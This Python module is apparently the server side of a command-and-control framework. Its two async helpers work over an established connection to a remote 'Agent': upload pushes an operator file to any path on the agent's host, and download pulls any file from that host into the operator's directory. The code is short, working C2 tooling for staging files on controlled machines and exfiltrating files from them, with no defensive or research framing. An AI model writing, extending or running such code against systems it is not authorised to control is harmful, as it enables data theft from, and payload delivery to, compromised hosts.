"""C2-side file transfer helpers.

Two async operations over an already-connected Agent:

- ``upload(local_path, dest_path)``: send an upload init packet, then
  stream the local file in 512-byte data packets, finally waiting for
  the Agent's result response.

- ``download(src_path)``: send a download init packet; the Agent's data
  packets are pushed by NetworkServer into ``info.data_queues[req_id]``.
  We consume that queue and assemble the file in the C2 program
  directory, then send a final ``download`` result response.

Both share the Agent's TCP connection. Per-Agent writes from this module
should not interleave with normal action commands; callers ensure that
uploads / downloads are not concurrent with chat sessions.
"""

import asyncio
import os
from pathlib import Path

from src.c2.agent_registry import AgentRegistry
from src.c2.forwarder import NetworkError
from common.protocol import (
    CMD_DOWNLOAD,
    CMD_UPLOAD,
    DATA_CHUNK_SIZE,
    END_FLAG_CONTINUE,
    END_FLAG_LAST,
    encode_data_packet,
    encode_request,
)


def _local_download_dir() -> Path:
    return Path(os.getcwd())


async def upload(
    registry: AgentRegistry,
    local_path: str,
    dest_path: str,
    timeout: float = 60.0,
) -> str:
    agent = registry.get_active()
    if agent is None:
        raise NetworkError("No active agent")
    src = Path(local_path).resolve()
    if not src.exists() or not src.is_file():
        return f"Error: local file not found: {local_path}"

    req_id = agent.allocate_request_id()
    fut: asyncio.Future = asyncio.get_running_loop().create_future()
    agent.pending[req_id] = fut
    try:
        async with agent.write_lock:
            init_pkt = encode_request(req_id, CMD_UPLOAD, [dest_path])
            agent.writer.write(init_pkt)
            await agent.writer.drain()

            with open(src, "rb") as f:
                while True:
                    chunk = f.read(DATA_CHUNK_SIZE)
                    if not chunk:
                        agent.writer.write(encode_data_packet(req_id, END_FLAG_LAST, b""))
                        await agent.writer.drain()
                        break
                    end_flag = END_FLAG_CONTINUE if len(chunk) == DATA_CHUNK_SIZE else END_FLAG_LAST
                    agent.writer.write(encode_data_packet(req_id, end_flag, chunk))
                    await agent.writer.drain()
                    if end_flag == END_FLAG_LAST:
                        break

        return await asyncio.wait_for(fut, timeout=timeout)
    except asyncio.TimeoutError:
        raise NetworkError("upload timeout")
    except Exception as e:
        raise NetworkError(f"upload failed: {e}")
    finally:
        agent.pending.pop(req_id, None)


async def download(
    registry: AgentRegistry,
    src_path: str,
    timeout: float = 120.0,
) -> str:
    agent = registry.get_active()
    if agent is None:
        raise NetworkError("No active agent")

    req_id = agent.allocate_request_id()
    queue: asyncio.Queue = asyncio.Queue(maxsize=8192)
    agent.data_queues[req_id] = queue
    dest = _local_download_dir() / os.path.basename(src_path)
    try:
        async with agent.write_lock:
            init_pkt = encode_request(req_id, CMD_DOWNLOAD, [src_path])
            agent.writer.write(init_pkt)
            await agent.writer.drain()

        fileobj = open(dest, "wb")
        try:
            while True:
                try:
                    end_flag, data = await asyncio.wait_for(queue.get(), timeout=timeout)
                except asyncio.TimeoutError:
                    raise NetworkError("download: queue timeout")
                if data:
                    fileobj.write(data)
                if end_flag == END_FLAG_LAST:
                    break
        finally:
            fileobj.close()

        return f"Saved to: {dest}"
    except NetworkError:
        raise
    except Exception as e:
        try:
            if dest.exists():
                dest.unlink()
        except OSError:
            pass
        raise NetworkError(f"download failed: {e}")
    finally:
        agent.data_queues.pop(req_id, None)